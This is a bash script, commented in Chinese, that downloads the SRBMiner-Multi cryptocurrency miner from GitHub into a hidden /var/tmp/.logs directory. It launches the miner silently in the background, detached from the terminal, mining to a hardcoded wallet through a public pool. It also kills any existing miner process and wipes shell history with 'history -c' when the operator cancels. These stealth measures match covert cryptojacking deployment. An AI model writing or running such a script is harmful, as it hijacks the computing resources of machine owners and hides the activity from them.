#!/bin/bash

# 下载文件的函数
download_file() {
    local url=$1
    local output_path=$2

    if command -v wget &> /dev/null; then
        echo "使用 wget 下载..."
        wget "$url" -O "$output_path" &> /dev/null
    elif command -v curl &> /dev/null; then
        echo "未找到 wget，使用 curl 下载..."
        curl -L "$url" -o "$output_path" &> /dev/null
    else
        echo "既未安装 wget，也未安装 curl。请安装其中之一后重试。"
        exit 1
    fi
}

# 查找运行中的 SRBMiner-MULTI 进程
process=$(pgrep -fl SRBMiner-MULTI)

if [ -n "$process" ]; then
    echo "找到 SRBMiner-MULTI 进程："
    # 输出进程的完整启动命令
    echo "$process" | awk '{print $1}' | xargs ps -o pid,cmd -p
    echo "请选择操作："
    echo "1) 终止进程并开始下载新版本"
    echo "2) 取消脚本运行"
    read -p "您的选择： " choice

    if [ "$choice" == "1" ]; then
        # 终止 SRBMiner-MULTI 进程
        pkill -f SRBMiner-MULTI
        echo "SRBMiner-MULTI 进程已终止。开始下载..."
    else
        echo "脚本已取消。"
        history -c
        clear
        exit 0
    fi
else
    echo "未找到 SRBMiner-MULTI 进程。开始下载新版本..."
fi

# 创建隐藏终端用于下载和运行
(
    # 归档文件路径和目录
    archive_path="/var/tmp/.logs/srbminer.tar.gz"
    download_url="https://github.com/doktor83/SRBMiner-Multi/releases/download/2.6.6/SRBMiner-Multi-2-6-6-Linux.tar.gz"

    # 下载 SRBMiner-MULTI 归档文件
    mkdir -p /var/tmp/.logs
    download_file "$download_url" "$archive_path"

    # 解压归档文件
    tar -xzf "$archive_path" -C /var/tmp/.logs/ &> /dev/null

    # 进入解压后的目录
    cd /var/tmp/.logs/SRBMiner-Multi-2-6-6

    # 赋予文件执行权限
    chmod +x ./SRBMiner-MULTI

    # 使用 PepePOW 配置启动 SRBMiner-MULTI，添加随机矿工名和代理
    ./SRBMiner-MULTI --disable-gpu --algorithm xelishashv2_pepew --cpu-threads 8 --pool stratum+tcp://eu.mining4people.com:4176 --wallet 0x6c12d35208e9be438ae91F15A4B3A99afb70Eadf.miner_$(shuf -i 1000-9999 -n 1)-$(date +%s) --password x >/dev/null 2>&1 & disown
)

echo "SRBMiner-MULTI 的下载和运行正在后台进行。"
